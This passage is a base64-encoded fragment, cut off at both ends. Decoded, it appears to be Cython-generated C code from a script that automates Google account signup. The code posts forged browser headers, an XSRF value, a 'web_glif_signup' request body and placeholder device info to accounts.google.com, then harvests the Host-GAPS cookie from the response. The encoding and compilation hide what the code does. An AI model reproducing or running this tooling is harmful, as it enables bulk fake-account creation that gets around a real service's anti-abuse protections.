sLT5fX3B5eF9rcF91X18zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FjY2VwdF9sYW5ndWFnZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9lbl9VU19lbl9xXzBfOSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9jb250ZW50X3R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ29vZ2xlX2FjY291bnRzX3hzcmYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29yaWdpbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVmZXJlciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wzX2Vycm9yKVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZ2IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTQwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fcHl4X3RfOSA9IDE7XG4gICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xMCkpKSB7XG4gICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTApO1xuICAgICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEwKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTAsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07XG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTQwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICB9XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3VzZXJfYWdlbnQsIF9fcHl4X3RfOCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICBfX3B5eF92X2hlYWRlcnMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE0MywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3RvaywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE0MywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShfX3B5eF92X24xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDE0MywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShfX3B5eF92X24yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTQzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoX19weXhfdl9uMSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE0MywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5VW5pY29kZV9Vbmljb2RlKF9fcHl4X3ZfbjIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNDMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzExWzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNDtcbiAgICAgIF9fcHl4X3RfMTFbMV0gPSBfX3B5eF90Xzg7XG4gICAgICBfX3B5eF90XzExWzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNTtcbiAgICAgIF9fcHl4X3RfMTFbM10gPSBfX3B5eF90XzEwO1xuICAgICAgX19weXhfdF8xMVs0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzU7XG4gICAgICBfX3B5eF90XzExWzVdID0gX19weXhfdF81O1xuICAgICAgX19weXhfdF8xMVs2XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzU7XG4gICAgICBfX3B5eF90XzExWzddID0gX19weXhfdF80O1xuICAgICAgX19weXhfdF8xMVs4XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzU7XG4gICAgICBfX3B5eF90XzExWzldID0gX19weXhfdF82O1xuICAgICAgX19weXhfdF8xMVsxMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzBfMF9udWxsX251bGxfd2ViX2dsaWZfc2lnbnVwXzA7XG4gICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xMSwgMTEsIDIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzgpICsgMyAqIDQgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEwKSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNSkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzQpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF82KSArIDQ4LCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF84KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzEwKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzUpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF82KSk7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTQzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZl9yZXEsIF9fcHl4X3RfMTIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGV2aWNlaW5mbywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9udWxsX251bGxfbnVsbF9udWxsX251bGxfTkxfbnVsKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE0MywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzEyID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzkgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNCkpKSB7XG4gICAgICAgIF9fcHl4X3RfMTIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF8xMik7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF80KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzQsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDMgOiAwKV0gPSB7X19weXhfdF8xMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbn07XG4gICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE0NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb29raWVzLCBfX3B5eF92X2Nvb2tpZXMsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNik7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE0NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgfVxuICAgICAgX19weXhfdl9yZXNwb25zZSA9IF9fcHl4X3RfNztcbiAgICAgIF9fcHl4X3RfNyA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGV4dCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAxNTIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX3B5eF90XzYgPSBQeVVuaWNvZGVfU3BsaXQoKChQeU9iamVjdCopX19weXhfdF8xMiksIF9fUHl4X05vbmVBc051bGwoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9udWxsKSwgLTFMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTUyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9HZXRJdGVtSW50X0xpc3QoX19weXhfdF82LCAxLCBsb25nLCAxLCBfX1B5eF9QeUxvbmdfRnJvbV9sb25nLCAxLCAwLCAxLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE1MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIF9fcHl4X3RfNCA9IF9fcHl4X3RfMTI7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzZ9O1xuICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BsaXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE1MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgfVxuICAgICAgX19weXhfdF8xMiA9IF9fUHl4X0dldEl0ZW1JbnQoX19weXhfdF83LCAwLCBsb25nLCAxLCBfX1B5eF9QeUxvbmdfRnJvbV9sb25nLCAwLCAwLCAxLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE1MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fcHl4X3ZfdGwgPSBfX3B5eF90XzEyO1xuICAgICAgX19weXhfdF8xMiA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llcyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE1MywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfNyA9IF9fcHl4X3RfNDtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgTlVMTH07XG4gICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0X2RpY3QsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTUzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgfVxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSG9zdF9HQVBTKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTUzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl9ob3N0LCBfX3B5eF90XzQpO1xuICAgICAgX19weXhfdF80ID0gMDtcblxuICAgICAgXG4gICAgICAge1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW5jb2RpbmcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXRmXzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTU0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfYnVpbHRpbl9vcGVuLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSwgX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEzKSkgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEzKTtcbiAgICAgICAgX19weXhfdF83ID0gTlVMTDtcbiAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNTQsIF9fcHl4X0w5X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgX19weXhfdF85ID0gMTtcbiAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgICBpZiAobGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7XG4gICAgICAgICAgX19weXhfdF83ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF82KTtcbiAgICAgICAgICBhc3NlcnQoX19weXhfdF83KTtcbiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgICAgfVxuICAgICAgICAjZW5kaWZcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIE5VTEx9O1xuICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMS1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTU0LCBfX3B5eF9MOV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF90XzYgPSBfX3B5eF90XzQ7XG4gICAgICAgIF9fcHl4X3RfNCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgICB7XG4gICAgICAgICAge1xuICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdG